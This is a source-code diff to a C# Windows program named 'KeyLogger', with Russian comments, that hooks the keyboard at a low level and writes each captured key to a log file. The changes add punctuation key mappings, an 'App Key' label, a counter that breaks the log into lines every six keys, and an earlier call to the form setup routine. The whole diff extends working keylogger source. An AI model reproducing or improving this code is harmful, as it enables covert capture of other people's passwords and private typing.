@@ -18,6 +18,9 @@ namespace KeyLogger
         // Иконка.
         private NotifyIcon notifyIcon = null;
 
+        // Счетчик для перехода на новую строку.
+        private static int countKeys = 0;
+
         // Делегат.
         private delegate IntPtr LowLevelKeyboardProc(
             int nCode, IntPtr wParam, IntPtr lParam);
@@ -65,6 +68,8 @@ namespace KeyLogger
         {
             InitializeComponent();
 
+            FormSetting();
+
             this.Load += MainForm_Load;
             this.FormClosing += MainForm_FormClosing;
         }
@@ -76,8 +81,6 @@ namespace KeyLogger
 
         private void MainForm_Load(object sender, EventArgs e)
         {
-            FormSetting();
-
             SetHook();
         }
 
@@ -369,6 +372,11 @@ namespace KeyLogger
                     {
                         sw.Write("[Windows key]");
                     }
+                    else if (vkCode.ToString() == "93")
+                    {
+                        sw.Write("[App Key]");
+                    }
+                    //
                     else if (vkCode.ToString() == "96")
                     {
                         sw.Write("0");
@@ -451,6 +459,61 @@ namespace KeyLogger
                     {
                         sw.Write("[CTRL]");
                     }
+                    //
+                    else if (vkCode.ToString() == "186")
+                    {
+                        sw.Write(";");
+                    }
+                    else if (vkCode.ToString() == "187")
+                    {
+                        sw.Write("=");
+                    }
+                    else if (vkCode.ToString() == "188")
+                    {
+                        sw.Write(",");
+                    }
+                    else if (vkCode.ToString() == "189")
+                    {
+                        sw.Write("-");
+                    }
+                    else if (vkCode.ToString() == "190")
+                    {
+                        sw.Write(".");
+                    }
+                    else if (vkCode.ToString() == "191")
+                    {
+                        sw.Write("/");
+                    }
+                    else if (vkCode.ToString() == "192")
+                    {
+                        sw.Write("`");
+                    }
+                    else if (vkCode.ToString() == "219")
+                    {
+                        sw.Write("[");
+                    }
+                    else if (vkCode.ToString() == "220")
+                    {
+                        sw.Write("\\");
+                    }
+                    else if (vkCode.ToString() == "221")
+                    {
+                        sw.Write("]");
+                    }
+                    else if (vkCode.ToString() == "222")
+                    {
+                        sw.Write("'");
+                    }
+
+
+                    countKeys++;
+                    // Переход на новую строку.
+                    if (countKeys % 6 == 0)
+                    {
+                        sw.Write("\n");
+                    }
+
+
                     sw.Close();
                 }
 
